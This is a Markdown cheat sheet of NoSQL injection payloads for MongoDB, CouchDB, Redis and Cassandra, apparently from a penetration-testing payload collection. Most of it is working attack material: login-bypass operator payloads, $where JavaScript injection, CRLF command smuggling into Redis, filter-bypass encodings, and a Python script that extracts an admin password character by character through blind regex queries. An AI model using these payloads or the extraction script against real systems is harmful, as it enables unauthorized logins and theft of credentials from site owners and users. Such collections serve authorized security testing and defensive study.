# 🍃 NoSQL Injection Payloads

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 MongoDB Injection

### Authentication Bypass
```javascript
// JSON injection
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL encoded
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Common Operators
```javascript
$eq     // Equal
$ne     // Not equal
$gt     // Greater than
$gte    // Greater than or equal
$lt     // Less than
$lte    // Less than or equal
$in     // In array
$nin    // Not in array
$regex  // Regular expression
$exists // Field exists
$or     // Logical OR
$and    // Logical AND
$where  // JavaScript expression
```

---

## 💉 Basic Payloads

### URL Parameter Injection
```
# Authentication bypass
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Always true conditions
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### JSON Body Injection
```json
// Basic bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Regex bypass
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// OR condition
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Greater than
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Data Extraction

### Regex-Based Extraction
```javascript
// Extract password character by character
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Extract with position
password[$regex]=^.{0}a.*   // First char is 'a'?
password[$regex]=^.{1}b.*   // Second char is 'b'?

// Common characters
password[$regex]=^[a-z].*   // Starts with lowercase
password[$regex]=^[A-Z].*   // Starts with uppercase
password[$regex]=^[0-9].*   // Starts with number
```

### Blind Boolean Extraction Script
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Advanced Payloads

### $where JavaScript Injection
```javascript
// Sleep-based (time-based blind)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Data extraction
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Error-based
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Array Injection
```json
// $in operator
{"username": {"$in": ["admin", "administrator", "root"]}}

// $nin operator
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Operator Injection
```
# Convert field to operator
username=admin&password[$ne]=wrongpassword

# Nested operator
username[$eq]=admin&password[$regex]=^p

# Multiple operators
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 CouchDB Injection

### Basic Payloads
```javascript
// Authentication bypass
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regex
{"selector": {"username": {"$regex": ".*"}}}

// Greater than
{"selector": {"password": {"$gt": null}}}
```

### View Injection
```javascript
// Mango query injection
{"selector": {"_id": {"$gt": null}}}

// Get all documents
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Redis Injection

### Basic Commands
```redis
# Key enumeration
KEYS *
SCAN 0

# Data extraction
GET key_name
HGETALL hash_name

# Set data
SET key value
HSET hash field value
```

### Command Injection via App
```
# If user input goes to Redis commands
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Cassandra Injection

### CQL Injection
```sql
-- Basic injection
' OR '1'='1
' OR ''='

-- ALLOW FILTERING bypass
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Comment injection
admin'--
admin'/*
```

---

## 🛡️ Bypass Techniques

### URL Encoding
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Unicode Bypass
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Array Syntax Variations
```
# Standard
password[$ne]=

# Alternative
password[0][$ne]=
password[][$ne]=
```

### Content-Type Manipulation
```
# Change from form to JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Injection Points

```
POST /login
- Body parameters (JSON/Form)
- Query string parameters

GET /users?id=
- Query parameters

Headers:
- Authorization
- Cookie values

API endpoints:
- GraphQL with MongoDB backend
- REST API filters
```

---

## 🔍 Detection Checklist

```markdown
□ Test $ne operator: {"field": {"$ne": ""}}
□ Test $gt operator: {"field": {"$gt": ""}}
□ Test $regex: {"field": {"$regex": ".*"}}
□ Test $where: {"$where": "1==1"}
□ Test URL array syntax: field[$ne]=
□ Test JSON operators
□ Check for different response times
□ Check for different response lengths
□ Test with different content types
```

---

## 🔗 Tools

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# mongoDB injection scanner
nuclei -t nosql-injection.yaml -u http://target

# Manual testing with curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Related Payloads

- [SQLi Payloads](./SQLi.md)
- [GraphQL Injection](./GraphQL-Injection.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)
